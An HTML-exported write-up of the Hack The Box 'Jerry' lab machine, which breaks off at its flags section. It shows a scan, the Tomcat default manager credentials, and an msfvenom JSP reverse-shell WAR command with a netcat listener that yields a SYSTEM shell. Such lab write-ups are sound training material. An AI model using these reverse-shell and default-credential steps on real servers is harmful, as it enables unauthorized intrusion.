@@ -1,0 +1,745 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Jerry HTB </title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+
+	table.collection-content {
+		width: 100%;
+		table-layout: fixed;
+	}
+
+	table.collection-content th,
+	table.collection-content td {
+		overflow-wrap: anywhere;
+	}
+
+	table.collection-content td > .user,
+	table.collection-content td > time {
+		white-space: pre-wrap;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content-wrapper {
+	overflow-x: auto;
+}
+
+@media only print {
+	.collection-content-wrapper {
+		overflow-x: visible;
+	}
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	gap: 46px;
+}
+
+.column {
+	min-width: 0;
+	overflow: hidden;
+}
+
+.column > *:first-child {
+	margin-top: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+table {
+	border-collapse: collapse;
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol.numbered-list.numbered-list-digits-2 {
+	padding-inline-start: 2em;
+}
+
+ol.numbered-list.numbered-list-digits-3plus {
+	padding-inline-start: 2.4em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="d83a8164-617e-821c-86e0-817ede0f0d4b" class="page sans"><header><img class="page-cover-image" src="cover.png" style="object-position:center 50%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Logo.png"/></div><h1 class="page-title" dir="auto">Jerry HTB </h1><p class="page-description" dir="auto"></p></header><div class="page-body"><div style="display:contents" dir="auto"><hr id="afea8164-617e-8322-b1eb-818c291c16f4"/></div><div style="display:contents" dir="ltr"><table id="d89a8164-617e-83be-97a4-01269aca81dc" class="simple-table"><tbody><div style="display:contents" dir="ltr"><tr id="d49a8164-617e-83c2-8fca-01e55954b187"><td id="KyhG" class="" style="width:84.6624984741211px">Name</td><td id="pjZN" class="" style="width:762.6625061035156px">Jerry</td></tr></div><div style="display:contents" dir="ltr"><tr id="d5ca8164-617e-83a7-a8b9-01e385d6f6d7"><td id="KyhG" class="" style="width:84.6624984741211px">Description</td><td id="pjZN" class="" style="width:762.6625061035156px">Jerry is an easy-difficulty Windows machine that showcases how to exploit Apache Tomcat, leading to an <code>NT Authority\SYSTEM</code> shell, thus fully compromising the target.</td></tr></div><div style="display:contents" dir="ltr"><tr id="233a8164-617e-8300-a1c9-817f0c93f7a6"><td id="KyhG" class="" style="width:84.6624984741211px">Difficulty</td><td id="pjZN" class="" style="width:762.6625061035156px">Easy </td></tr></div><div style="display:contents" dir="ltr"><tr id="345a8164-617e-82d1-ab0c-0155919723ef"><td id="KyhG" class="" style="width:84.6624984741211px">Room</td><td id="pjZN" class="" style="width:762.6625061035156px"><a href="https://app.hackthebox.com/machines/Jerry?sort_by=created_at&amp;sort_type=desc">https://app.hackthebox.com/machines/Jerry?sort_by=created_at&amp;sort_type=desc</a></td></tr></div><div style="display:contents" dir="ltr"><tr id="9b1a8164-617e-8211-a2c1-816ebd15e8a1"><td id="KyhG" class="" style="width:84.6624984741211px">Host </td><td id="pjZN" class="" style="width:762.6625061035156px">10.129.136.9</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h2 id="a1fa8164-617e-820e-b928-01502d487f82" class="">Reconnaissance</h2></div><div style="display:contents" dir="auto"><h3 id="b3aa8164-617e-83be-8565-0126d04c5523" class="">Nmap Scan</h3></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><pre id="25da8164-617e-8238-b036-8132fc03fdf0" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">sudo nmap -T4 -sS -sV -sC -v -Pn -A 10.129.136.9 </code></pre></div><div style="display:contents" dir="auto"><p id="527a8164-617e-8220-af7f-0186ec99d77f" class=""><strong>Results:</strong></p></div><div style="display:contents" dir="ltr"><table id="98da8164-617e-83bc-9285-81bbe3023287" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="4d9a8164-617e-83e6-a71b-0136fe2e0ec2"><th id="_DOP" class="simple-table-header-color simple-table-header">Port</th><th id=";gUv" class="simple-table-header-color simple-table-header">Service</th><th id="{[QR" class="simple-table-header-color simple-table-header" style="width:68px">Version</th><th id="uJaM" class="simple-table-header-color simple-table-header" style="width:494px">Notes</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="3c6a8164-617e-82d9-ad39-816e911da3a8"><td id="_DOP" class="">8080</td><td id=";gUv" class="">Apache Tomcat/Coyote JSP engine <br/></td><td id="{[QR" class="" style="width:68px">1.1</td><td id="uJaM" class="" style="width:494px">From title its hosting Apache Tomcat/7.0.88 and that s the only open ports  </td></tr></div></tbody></table></div><div style="display:contents" dir="ltr"><figure id="362a8164-617e-806b-b463-fcdc6d14a8b4" class="image"><a href="service.png"><img style="width:912px" src="service.png"/></a></figure></div><div style="display:contents" dir="auto"><h3 id="d14a8164-617e-83aa-bf30-016ff32d514e" class="">Web Enumeration </h3></div><div style="display:contents" dir="auto"><pre id="49da8164-617e-8314-ac60-011b5c879b62" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">whatweb http://10.129.136.9:8080</code></pre></div><div style="display:contents" dir="ltr"><figure id="362a8164-617e-80e7-87a2-d3432fdbf8b2" class="image"><a href="whatweb.png"><img style="width:912px" src="whatweb.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="296a8164-617e-8216-a7cc-8108e01ab7ee" class=""><strong>Findings:</strong></p></div><div style="display:contents" dir="auto"><ul id="363a8164-617e-806b-b3c4-f3d49fda12e1" class="bulleted-list"><li style="list-style-type:disc">Service Disclosure Apache Tomcat/7.0.88</li></ul></div><div style="display:contents" dir="auto"><ul id="e16a8164-617e-83f7-a46c-01d01c0bf8e2" class="bulleted-list"><li style="list-style-type:disc">Apache Tomcat/7.0.88 default page after opening the website on port 8080</li></ul></div><div style="display:contents" dir="auto"><ul id="362a8164-617e-8058-9297-f6d6b6312554" class="bulleted-list"><li style="list-style-type:disc">Login portal /manager/html (From documentation on default page)</li></ul></div><div style="display:contents" dir="auto"><ul id="362a8164-617e-80fd-aa11-e75ae59aaa28" class="bulleted-list"><li style="list-style-type:disc">Default credential revealed after failed login attempt </li></ul></div><div style="display:contents" dir="ltr"><figure id="362a8164-617e-805e-b18d-e755a0fe7694" class="image"><a href="defaultcred.png"><img style="width:864px" src="defaultcred.png"/></a><figcaption>Failed Login page</figcaption></figure></div><div style="display:contents" dir="auto"><h3 id="61fa8164-617e-83c4-8c9e-81e4dfe9c2c6" class="">Credentials Discovered</h3></div><div style="display:contents" dir="ltr"><table id="68ca8164-617e-832e-a95f-81535eeebef5" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="cbea8164-617e-83b3-b117-817cecc038c2"><th id="K;~V" class="simple-table-header-color simple-table-header">Type</th><th id="=\=u" class="simple-table-header-color simple-table-header">Value</th><th id="YtJW" class="simple-table-header-color simple-table-header">Found At</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="522a8164-617e-8337-b8d6-815760b84165"><td id="K;~V" class="">Default </td><td id="=\=u" class="">tomcat:s3cret</td><td id="YtJW" class="">Failed login page /manager/html</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><h2 id="f38a8164-617e-83a3-b1de-010f15ed9f80" class="">Exploitation</h2></div><div style="display:contents" dir="ltr"><table id="06da8164-617e-8395-9347-81648542b31e" class="simple-table"><thead class="simple-table-header"><div style="display:contents" dir="ltr"><tr id="d16a8164-617e-83df-bff5-81fea3913714"><th id="YTYo" class="simple-table-header-color simple-table-header">Field</th><th id="th@r" class="simple-table-header-color simple-table-header">Value</th></tr></div></thead><tbody><div style="display:contents" dir="ltr"><tr id="5c0a8164-617e-83fd-9854-01d407c3cf30"><td id="YTYo" class="">Vulnerability Type</td><td id="th@r" class="">Security Misconfiguration</td></tr></div><div style="display:contents" dir="ltr"><tr id="362a8164-617e-80bc-8c90-d862d4e19ded"><td id="YTYo" class="">CVE</td><td id="th@r" class="">n/a</td></tr></div><div style="display:contents" dir="ltr"><tr id="7d8a8164-617e-833a-ba11-015bcfc312f9"><td id="YTYo" class=""><strong>Type</strong></td><td id="th@r" class="">Authenticated RCE </td></tr></div><div style="display:contents" dir="ltr"><tr id="deca8164-617e-83ae-aa6b-01d41d8b2a0f"><td id="YTYo" class=""><strong>Source</strong></td><td id="th@r" class="">Manual - Msfvenom</td></tr></div><div style="display:contents" dir="ltr"><tr id="75da8164-617e-825a-9990-8112a061c7ff"><td id="YTYo" class=""><strong>Target</strong></td><td id="th@r" class="">Service:8080</td></tr></div></tbody></table></div><div style="display:contents" dir="auto"><p id="362a8164-617e-8063-b92e-e9b56e9952dd" class="">The website allows upload of .war files to create new webpage. Using <code>msfvenom</code> to create a .war payload is the best exploitation approach to exploit the machine.</p></div><div style="display:contents" dir="auto"><pre id="362a8164-617e-8089-af0d-f32ff6b52f3a" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.58 LPORT=1997 -f war &gt; jerry.war</code></pre></div><div style="display:contents" dir="auto"><p id="aa3a8164-617e-830b-a2b8-01f3ed42351e" class=""><strong>Proof of concept:</strong></p></div><div style="display:contents" dir="auto"><p id="362a8164-617e-80ca-905b-e006d18ae5e3" class="">Create a netcat Listener  on port 1997</p></div><div style="display:contents" dir="auto"><pre id="362a8164-617e-8095-80ce-f8416676bc85" class="code code-wrap"><code class="language-bash" style="white-space:pre-wrap;word-break:break-all">nc -nvlp 1997</code></pre></div><div style="display:contents" dir="auto"><p id="362a8164-617e-80e0-85cc-f72229d422ca" class="">After signing in with the acquired credentials, scroll to the deploy section and upload the jerry.war file. </p></div><div style="display:contents" dir="auto"><p id="363a8164-617e-80f4-a58f-c9f82e371e47" class="">Browse to /jerry/ to trigger the reverse shell</p></div><div style="display:contents" dir="auto"><blockquote id="8c3a8164-617e-8285-b6e0-812439ba9c68" class=""><div style="display:contents" dir="auto"><p id="9cba8164-617e-83be-90e5-01d4ca2493d4" class=""><strong>Initial foothold</strong></p></div><div style="display:contents" dir="ltr"><figure id="362a8164-617e-8013-8aa2-e5fa8bed2fc1" class="image" style="text-align:center"><a href="exploitation.png"><img style="width:550.9500122070312px" src="exploitation.png"/></a><figcaption>Initial Foothold: Reverse shell</figcaption></figure></div></blockquote></div><div style="display:contents" dir="auto"><h2 id="53ea8164-617e-83ed-97b5-01ff94e31a76" class="">Post-Exploitation</h2></div><div style="display:contents" dir="ltr"><figure id="362a8164-617e-8047-84e2-cff3d772920b" class="image"><a href="currentuser.png"><img style="width:364.9875183105469px" src="currentuser.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="8e5a8164-617e-83cb-afcf-01f26b8ea1b3" class=""><strong>Current user:  </strong><code><strong>nt authority\system</strong></code></p></div><div style="display:contents" dir="auto"><p id="466a8164-617e-8224-b2e4-819a6a848988" class=""><strong>Current directory:</strong>  C:\apache-tomcat-7.0.88</p></div><div style="display:contents" dir="auto"><h2 id="2b4a8164-617e-8385-b090-0159ab3c7df4" class="">Flags</h2></div><div style="display:contents" dir="ltr"><figure id="362a8164-617e-8043-a4cc-dc7c2c33670b" class="image"><a href="flags.png"><img style="width:528px" 